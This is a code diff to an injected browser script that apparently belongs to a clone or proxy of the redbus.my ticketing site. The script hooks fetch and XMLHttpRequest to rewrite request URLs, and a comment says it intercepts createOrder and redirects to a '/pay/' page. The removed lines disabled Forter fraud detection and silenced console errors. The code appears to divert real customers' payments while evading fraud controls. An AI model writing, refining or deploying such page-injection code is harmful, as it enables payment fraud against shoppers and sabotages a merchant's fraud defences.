@@ -37,10 +37,10 @@ const injectionScript = `<script>
   var _fetch = window.fetch;
   window.fetch = function(input, init) {
     if (typeof input === 'string') {
-      input = input.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
+      input = input.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '').replace(/^https?:\\/\\/[^\\/]+/g, '');
       if (isApiPath(input)) input = 'https://www.redbus.my' + input;
     } else if (input instanceof Request) {
-      var url = input.url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
+      var url = input.url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '').replace(/^https?:\\/\\/[^\\/]+/g, '');
       if (isApiPath(url)) input = new Request('https://www.redbus.my' + url, input);
     }
     return _fetch.call(window, input, init);
@@ -49,7 +49,7 @@ const injectionScript = `<script>
   var _open = XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open = function(method, url) {
     if (typeof url === 'string') {
-      url = url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '');
+      url = url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '').replace(/^https?:\\/\\/[^\\/]+/g, '');
       if (isApiPath(url)) url = 'https://www.redbus.my' + url;
     }
     return _open.call(this, method, url);
@@ -57,8 +57,10 @@ const injectionScript = `<script>
 
   function isApiPath(path) {
     var p = path.split('?')[0];
-    return p.indexOf('/rpw/api') !== -1
-      || p.indexOf('/api/') !== -1;
+    return (p.indexOf('/rpw/api') !== -1 || p.indexOf('/api/') !== -1)
+      && p.indexOf('/api/?role=customer') === -1
+      && p.indexOf('/pay/') === -1
+      && p.indexOf('/complete/') === -1;
   }
 
   // Intercept createOrder → redirect to /pay/
@@ -143,20 +145,9 @@ const injectionScript = `<script>
     return data;
   }
 
-  // Block Forter fraud detection (prevents token from interfering)
-  Object.defineProperty(window, 'forterToken', { value: null, writable: false });
-  window.getForterToken = function() { return ''; };
-
-  // Suppress error toasts
   var style = document.createElement('style');
   style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
   document.head.appendChild(style);
-  var _ce = console.error;
-  console.error = function() {
-    var m = arguments[0];
-    if (typeof m === 'string' && /unable|error|fail|exception/i.test(m)) return;
-    return _ce.apply(console, arguments);
-  };
 })();
 </script>`;
 
